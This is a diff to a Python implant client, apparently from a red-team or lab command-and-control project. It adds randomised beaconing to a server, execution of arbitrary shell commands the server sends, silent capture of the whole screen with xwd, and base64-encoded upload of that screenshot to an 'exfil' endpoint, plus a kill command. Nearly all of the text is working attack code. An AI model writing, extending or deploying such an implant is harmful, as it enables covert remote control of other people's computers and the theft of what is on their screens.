@@ -9,40 +9,39 @@ import uuid
 from platform import node
 import requests
 import json
+import string
+import subprocess
+import base64
 
 SERVER_IP = "localhost"
 SERVER_PORT = 8000
 BUFFER_SIZE = 2048
-OS = os.popen("lsb_release -d | cut -d ':' -f2").read().strip()
+OS = subprocess.Popen("lsb_release -d | cut -d ':' -f2", shell=True, stdout = subprocess.PIPE).communicate()[0].strip()
 UUID = uuid.uuid1()
 HOSTNAME = node().strip()
 MAX_FAILS = 10
 failCount = 0
-
-def connectToServer(ip, port):
-    print("Connecting to server")
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, port))
-    return s
-
-def sendData(socket, data):
-    print("Sending Data")
-    socket.sendall(data.encode())
-    print("SENT")
-
-def closeSocket(socket):
-    print("Closing Socket")
-    socket.close()
+LOW_TIME = 1
+HIGH_TIME = 10
 
 def beacon():
     r = requests.get(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT) + "/client/" + str(UUID) + "/commands"))
     return r.text
 
-def httpPost():
+def httpPost(directory, exfilData, exfilFile):
+    encoded = base64.encodebytes(exfilData)
     data = {'UUID':UUID,
             'OS':OS,
-            'HOSTNAME':HOSTNAME}
-    r = requests.post(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT) + "/update"), data = data)
+            'HOSTNAME':HOSTNAME,
+            'MAX_FAILS':MAX_FAILS,
+            'LOW_TIME':LOW_TIME,
+            'HIGH_TIME':HIGH_TIME,
+            'EXFIL_DATA':base64.b64encode(exfilData)}
+    if exfilFile:
+        files = {'exfilFile': exfilFile}
+    else:
+        files = ""
+    r = requests.post(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT) + "/" + directory), data = data, files=files)
 
 
 if __name__ == "__main__":
@@ -63,7 +62,19 @@ if __name__ == "__main__":
             print(serverText["command"])
             print(serverText["args"])
             if serverText["command"] == "EXECUTE":
-                print(os.popen(serverText["args"]).read())
+                os.popen(serverText["args"])
             elif serverText["command"] == "UPDATE":
-                httpPost()
-        time.sleep(random.randint(1,10))
+                httpPost("update", b"", "")
+            elif serverText["command"] == "KILL":
+                exit()
+            elif serverText["command"] == "SCREENSHOT":
+                fileName = str(time.time()) + ".xwd"
+ #               tempDir = "/tmp/." + ''.join(random.choice(string.ascii_letters) for i in range(15))
+#                os.popen("mkdir " + tempDir)
+                image = subprocess.Popen("xwd -silent -root -display :0.0", shell=True, stdout = subprocess.PIPE).communicate()[0]
+               # print(image + "DONE")
+ #               os.popen("xwd -out " + tempDir + "/" + fileName + " -root -display :0.0")
+                httpPost("exfil", image, "")
+  #              os.popen("rm -rf " + tempDir + "/" + fileName)
+
+        time.sleep(random.randint(LOW_TIME,HIGH_TIME))
